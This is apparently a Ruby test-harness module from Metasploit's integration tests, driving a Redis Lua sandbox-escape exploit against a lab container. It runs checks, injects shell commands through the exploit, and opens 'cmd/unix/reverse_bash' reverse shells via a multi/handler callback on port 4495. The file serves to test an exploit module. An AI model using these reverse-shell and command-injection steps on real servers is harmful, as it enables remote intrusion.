# frozen_string_literal: true

require 'shellwords'
require_relative '../rsync_creds/native'

# Native package/Lua gates precede original checks, commands and real sessions.
module RedisLuaTarget
  include RsyncCredentialTarget

  OWNER = 'exploit/linux/redis/redis_debian_sandbox_escape'
  CALLBACK_PORT = 4495
  PASSWORD = 'module-target-redis-password'

  def rc_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'redis-lua-owner.json'), JSON.pretty_generate(@rc)) if @rc
  end

  def rc_resource_roles
    ['target']
  end

  def rl_native(action, *arguments)
    arguments = [CALLBACK_PORT.to_s] if %w[before state].include?(action)
    argv = ['python3', '-B', 'test/module_targets/redis_lua/native_probe.py', action, *arguments]
    output, error, status = Open3.capture3(*argv)
    @rc[:native] << { action: action, argv: argv, exit: status.exitstatus, stdout: output, stderr: error }
    rc_save
    expect(status.success?).to be(true), output + error
    JSON.parse(output)
  end

  def rl_state
    state = rl_native('state')
    state.fetch('processes').each { |row| row.delete('state') }
    state
  end

  def rl_idle
    expect(rc_json('{sessions:framework.sessions.keys,jobs:framework.jobs.keys}')).to eq('sessions' => [], 'jobs' => [])
    expect(rl_native('snapshot')).to eq(@rc.fetch(:readiness).fetch('baseline'))
    expect(rl_state).to eq(@rc.fetch(:baseline_state))
  end

  def rl_ready
    @rc.delete(:prepared)
    @rc[:readiness] = rl_native('before')
    expect(@rc.fetch(:readiness)).to include('passed' => true, 'module_invoked' => false)
    @rc[:settings] = @rc.fetch(:readiness).fetch('settings')
    @rc[:baseline_state] = rl_state
    @rc[:session_observer] = rc_json("begin;load 'test/module_targets/druid_sessions/session_control.rb';ready=DruidSessionControl.install(framework);load 'test/module_targets/laravel/session_control.rb';ready;end")
    @rc[:owner_observer] = rc_json("begin;load 'test/module_targets/redis_lua/observe.rb';RedisLuaObservation.install(framework,#{target_runtime.fetch('artifacts').inspect});end")
    rc_resources('before')
    rl_idle
    @rc[:prepared] = true
  ensure
    rc_save
  end

  def rl_call(label, options = {}, action: 'check', reuse: false)
    offset = rc_json('framework.instance_variable_get(:@redis_lua_events).length')
    call = { label: label, options: options, action: action }
    @rc[:calls] << call
    settings = { 'PASSWORD' => PASSWORD, 'READ_TIMEOUT' => 1 }.merge(options)
    if options.key?('CMD')
      unless reuse
        console_command('back')
        expect(console_command('use ' + OWNER)).not_to match(/Failed to load|Unknown command|No results/)
      end
      %w[TARGET PAYLOAD].each { |name| console_command("set #{name} #{options.fetch(name)}") }
      # Preserve physical CR/LF and quoting through the console's line parser.
      call[:command_assignment] = rc_json("begin;active_module.datastore['CMD']=#{options.fetch('CMD').inspect};true;end")
      settings = settings.except('CMD', 'TARGET', 'PAYLOAD')
      reuse = true
    end
    run_target_module(OWNER, 'target', settings, action: action, reuse_module: reuse, allow_errors: true, command_timeout: 45) do |output|
      call[:output] = output
      call[:events] = rc_json("framework.instance_variable_get(:@redis_lua_events).drop(#{offset})")
      call[:selection] = rc_json('{object:active_module.object_id,target:active_module.target_index,payload:active_module.datastore["PAYLOAD"],autocheck:active_module.class.ancestors.include?(Msf::Exploit::Remote::AutoCheck)}')
      rc_save
    end
    call
  end

  def rl_codes(call)
    call.fetch(:events).filter_map { |event| event['check'] }
  end

  def rl_checks(options = {})
    calls = 2.times.map { |index| rl_call('check-' + index.to_s, options, reuse: index.positive?) }
    expect(calls.map { |call| call.fetch(:selection).fetch('object') }.uniq.length).to eq(1)
    expected = if @rc.fetch(:settings).fetch('vulnerable')
                 { 'code' => 'vulnerable', 'reason' => "Successfully executed the 'id' command." }
               else
                 { 'code' => 'safe', 'reason' => "Could not execute 'id' on the remote target." }
               end
    calls.each do |call|
      expect(rl_codes(call)).to eq([expected])
      expect(call.fetch(:events).select { |event| event['owner_exploit_body'] }).to eq([])
    end
    rl_idle
  end

  def rl_authentication
    call = rl_call('wrong-password', { 'PASSWORD' => 'wrong-password' })
    if @rc.fetch(:settings).fetch('authenticated')
      expect(rl_codes(call)).to eq([{ 'code' => 'unknown', 'reason' => 'Failed authentication.' }])
      expect(call.fetch(:events).select { |event| event.values_at('event', 'method') == %w[call do_popen] }).to eq([])
    else
      expect(rl_codes(call)).to eq([{ 'code' => 'vulnerable', 'reason' => "Successfully executed the 'id' command." }])
    end
    # A failed authentication must not poison a subsequent valid connection.
    rl_checks
  end

  def rl_commands(label, marker)
    selections = []
    2.times do |index|
      path = "/tmp/module-target-redis-owner-#{Process.pid}-#{label}-#{index}"
      bytes = marker + index.to_s
      command = 'printf %s ' + Shellwords.escape(bytes) + ' > ' + path
      control = rl_native('command-control', Base64.strict_encode64(command.b), path, Base64.strict_encode64(bytes.b))
      expect(control).to include('passed' => true, 'command_base64' => Base64.strict_encode64(command.b))
      call = rl_call(label + '-' + index.to_s,
                     { 'TARGET' => 0, 'PAYLOAD' => 'cmd/unix/generic', 'CMD' => command, 'AutoCheck' => index.zero?, 'DisablePayloadHandler' => true, 'WfsDelay' => 0 },
                     action: 'run -z', reuse: index.positive?)
      selections << call.fetch(:selection).fetch('object')
      expect(call.fetch(:events).count { |event| event['owner_exploit_body'] }).to eq(1)
      expect(call.fetch(:events).select { |event| event.values_at('event', 'method') == %w[call execute_command] }.map { |event| event.fetch('command_base64') }).to eq([Base64.strict_encode64(command.b)])
      expect(rl_codes(call).length).to eq(index.zero? ? 1 : 0)
      call[:proof] = rl_native('file', path)
      rc_save
      expect(call.fetch(:output)).not_to match(/Exploit failed|Exploit aborted/)
      expect(call.fetch(:proof)).to eq('exists' => true, 'uid' => 101, 'base64' => Base64.strict_encode64(bytes.b))
      rl_native('file', path, 'remove')
      rl_idle
    ensure
      rl_native('file', path, 'remove') if path
    end
    expect(selections.uniq.length).to eq(1)
  end

  def rl_session(attempt, owner)
    metadata = rc_poll(15) do
      ready = File.readlines(@rc.fetch(:session_observer).fetch('ready_event_path')).filter_map do |line|
        JSON.parse(line)['id']
      rescue JSON::ParserError
        nil
      end
      rc_json('framework.sessions.map{|id,session|{id:id,type:session.type,owner:session.via_exploit,payload:session.via_payload}}').find do |row|
        ready.include?(row.fetch('id')) && row.values_at('type', 'owner', 'payload') == ['shell', owner, 'payload/cmd/unix/reverse_bash']
      end
    end
    attempt[:session] = metadata
    identifier = metadata.fetch('id')
    path = "/tmp/module-target-redis-session-#{Process.pid}-#{identifier}"
    expect(rl_native('file', path)).to eq('exists' => false)
    attempt[:proof] = rc_json("LaravelSessionControl.proof(framework,#{identifier},#{path.inspect},'redis-session',false,component:'redis')")
    expect(rl_native('file', path)).to eq('exists' => true, 'uid' => 101, 'base64' => Base64.strict_encode64('redis-session'))
    attempt[:live_state] = rl_state
    expect(attempt.fetch(:live_state).fetch('processes')).to include(include('pid' => attempt.fetch(:proof).fetch('pid'), 'uid' => 101))
    expect(attempt.fetch(:live_state).fetch('connections')).not_to be_empty
    attempt[:shutdown] = rc_json("LaravelSessionControl.shutdown(framework,#{identifier},component:'redis')")
    rc_json("framework.sessions[#{identifier}]&.kill;true")
    rc_poll(15) { rl_state == @rc.fetch(:baseline_state) }
    console_command('jobs -K')
    attempt[:used_and_closed] = true
  ensure
    rl_native('file', path, 'remove') if path
    rc_save
  end

  def rl_default_sessions
    host, = rc_command('callback-address', 'target', 'getent', 'ahostsv4', 'host.docker.internal')
    address = host.split.first
    expect(address).to match(/\A\d+(?:\.\d+){3}\z/)
    options = { 'LHOST' => address, 'LPORT' => CALLBACK_PORT, 'ReverseListenerBindAddress' => '0.0.0.0', 'WfsDelay' => 5 }
    attempt = { route: 'native-cli' }
    @rc[:attempts] << attempt
    console_command('back')
    console_command('use exploit/multi/handler')
    options.merge('PAYLOAD' => 'cmd/unix/reverse_bash', 'ExitOnSession' => false).each { |key, value| console_command("set #{key} #{value}") }
    attempt[:handler] = console_command('run -j -z')
    attempt[:generated] = rc_json("begin;job=framework.jobs.values.find{|entry|entry.ctx.first.fullname=='exploit/multi/handler'};raise 'No handler' unless job;{payload:job.ctx[1].refname,source:Base64.strict_encode64(job.ctx.first.payload.encoded)};end")
    expect(attempt.fetch(:generated).fetch('payload')).to eq('cmd/unix/reverse_bash')
    path = "/tmp/module-target-redis-native-#{Process.pid}"
    argv = target_runtime.fetch('compose') + ['exec', '-T', 'target', 'sh', '-c', 'cat > "$1"', 'native-source', path]
    output, error, status = Open3.capture3(*argv, stdin_data: Base64.strict_decode64(attempt.fetch(:generated).fetch('source')))
    expect(status.success?).to be(true), output + error
    rc_command('native-syntax', 'target', 'bash', '-n', path)
    rc_command('native-launch', 'target', 'sh', '-c', 'sh "$1" > "$1-output" 2>&1 &', 'native-shell', path)
    rl_session(attempt, 'exploit/multi/handler')
    [path, path + '-output'].each { |file| rl_native('file', file, 'remove') }
    rl_idle
    calls = 2.times.map do |index|
      call = rl_call('default-session-' + index.to_s, options.merge('AutoCheck' => index.zero?), action: 'run -z', reuse: index.positive?)
      @rc[:attempts] << call
      expect(call.fetch(:selection)).to include('target' => 0, 'payload' => 'cmd/unix/reverse_bash', 'autocheck' => true)
      expect(call.fetch(:output)).not_to match(/Exploit failed|Exploit aborted/)
      expect(call.fetch(:events).count { |event| event['owner_exploit_body'] }).to eq(1)
      rl_session(call, OWNER)
      rl_idle
      call
    end
    expect(calls.map { |call| call.fetch(:selection).fetch('object') }.uniq.length).to eq(1)
  ensure
    console_command('sessions -K')
    console_command('jobs -K')
    [path, path && path + '-output'].compact.each { |file| rl_native('file', file, 'remove') }
    rc_save
  end

  def rl_fixed_refusal
    path = "/tmp/module-target-redis-owner-#{Process.pid}-fixed"
    command = 'printf %s should-not-execute > ' + path
    rl_native('command-control', Base64.strict_encode64(command), path, Base64.strict_encode64('should-not-execute'))
    calls = 2.times.map do |index|
      call = rl_call('fixed-refusal-' + index.to_s,
                     { 'TARGET' => 0, 'PAYLOAD' => 'cmd/unix/generic', 'CMD' => command, 'AutoCheck' => true, 'DisablePayloadHandler' => true, 'WfsDelay' => 0 },
                     action: 'run -z', reuse: index.positive?)
      expect(rl_codes(call)).to eq([{ 'code' => 'safe', 'reason' => "Could not execute 'id' on the remote target." }])
      expect(call.fetch(:events).select { |event| event['owner_exploit_body'] }).to eq([])
      expect(rl_native('file', path)).to eq('exists' => false)
      rl_idle
      call
    end
    expect(calls.map { |call| call.fetch(:selection).fetch('object') }.uniq.length).to eq(1)
  ensure
    rl_native('file', path, 'remove') if path
  end

  def rl_missing_library
    call = rl_call('missing-library', { 'LUA_LIB' => '/tmp/module-target-redis-missing-library.so' })
    expect(rl_codes(call)).to eq([{ 'code' => 'safe', 'reason' => "Could not execute 'id' on the remote target." }])
    rl_checks('LUA_LIB' => @rc.fetch(:readiness).fetch('library'))
  end

  def rl_refused
    server = TCPServer.new('127.0.0.1', 0)
    port = server.local_address.ip_port
    server.close
    expect { TCPSocket.new('127.0.0.1', port) }.to raise_error(Errno::ECONNREFUSED)
    call = rl_call('refused-check', { 'RPORT' => port, 'ConnectTimeout' => 2 })
    expect(rl_codes(call)).to match([include('code' => 'unknown', 'reason' => a_string_matching(/\S/))])
  ensure
    server&.close unless server&.closed?
  end

  def rl_cleanup
    return unless @rc && @rc[:prepared]

    console_command('sessions -K')
    console_command('jobs -K')
    @rc[:final_snapshot] = rl_native('snapshot')
    @rc[:final_state] = rl_state
    rc_resources('after')
    rc_save
  end
end
